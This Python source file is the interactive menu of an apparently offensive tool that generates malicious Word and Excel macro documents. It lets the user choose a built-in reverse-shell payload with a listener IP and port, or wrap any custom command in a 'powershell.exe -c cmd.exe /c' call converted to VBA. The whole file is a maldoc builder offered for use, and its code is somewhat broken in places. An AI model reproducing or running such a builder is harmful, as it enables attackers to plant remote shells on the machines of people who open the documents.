from utils.vba_synthax import convertToVbaSynthax
from payloads.Rev import revshell
from payloads.Word import payloadWord
from payloads.Excel import payloadExcel
from utils.utils import banner
import questionary
from questionary import Validator, ValidationError
from os import sys

def interactive():
    class NonEmptyValidator(Validator):
            def validate(self, document):
                if not document.text.strip():
                    raise ValidationError(
                        message="La valeur ne peut pas être vide.",
                        cursor_position=len(document.text)
                    )

    def show_menu(interactive=True):
            """
            interactive: if False, uses defaults (useful for tests / automation)
            """
            if not interactive:
                
                file_choice = "Word"
                payload_choice = "notepad.exe"
                obfuscate_choice = True
                print("Running non-interactive with defaults:", file_choice, payload_choice, obfuscate_choice)
                return file_choice, payload_choice, obfuscate_choice

            try:
                file_choice = questionary.select(
                    "Choose your file type:",
                    choices=["Word", "Excel"]
                ).ask()

                
                if file_choice is None:
                    raise KeyboardInterrupt
                print("\n[!] If you choose 'type your own payload', the command may break.")
                print("If you just need a rev shell use built in module !! \n")
                
                payload_choice = questionary.select(
                    "Choose your payload type:",
                    choices=["revshell", "type your own payload"]
                ).ask()
                if payload_choice is None:
                    print("Opération annulée.")
                    return
                


                

                

                if payload_choice is None:
                    raise KeyboardInterrupt

                return file_choice, payload_choice

            except KeyboardInterrupt:
                print("\nOperation cancelled by user.")
                sys.exit(0)


    file_choice, payload_choice = show_menu(interactive=True)

    print(f"You chose file: {file_choice}, payload type: {payload_choice}")

        
    if file_choice == "Word":
        if payload_choice == "revshell":
            ip = questionary.text(
                        "ip listener: ",
                        validate=NonEmptyValidator
                    ).ask()
            class NonEmptyValidator(Validator):
                def validate(self, document):
                    if not document.text.strip():
                        raise ValidationError(
                            message="La valeur ne peut pas être vide.",
                            cursor_position=len(document.text)
                        )
            port = questionary.text(
                        "port listener: ",
                        validate=NonEmptyValidator
                    ).ask()
            class NonEmptyValidator(Validator):
                def validate(self, document):
                    if not document.text.strip():
                        raise ValidationError(
                            message="La valeur ne peut pas être vide.",
                            cursor_position=len(document.text)
                        )
            revshell(ip=ip, port=port, file="Word")
        elif payload_choice == "type your own payload":
                    payload = questionary.text(
                        "Type your payload:",
                        validate=NonEmptyValidator
                    ).ask()
                    payload = payload.strip()
                    payload = convertToVbaSynthax(payload)
                    payload = f"{payload}"
                    payloadWord(payload)
        else:
            payload = f'cmd = "powershell.exe -c cmd.exe /c {payload_choice}"'
            payloadWord(payload)


            
    elif file_choice == "Excel":
        if payload_choice == "revshell":
            ip = questionary.text(
                        "ip listener: ",
                        validate=NonEmptyValidator
                    ).ask()
            port = questionary.text(
                        "port listener: ",
                        validate=NonEmptyValidator
                    ).ask()
            revshell(ip=ip, port=port, file="Excel")
        elif payload_choice == "type your own payload":
                            payload = questionary.text(
                                "Type your payload:",
                                validate=NonEmptyValidator
                            ).ask()
                            payload = payload.strip()
                                
                            payload = convertToVbaSynthax(payload)
                            payload = f"{payload}"
                            payloadExcel(payload)
        else:
            payload = f'cmd = "powershell.exe -c cmd.exe /c {payload_choice}"'
            payloadExcel(payload)
        



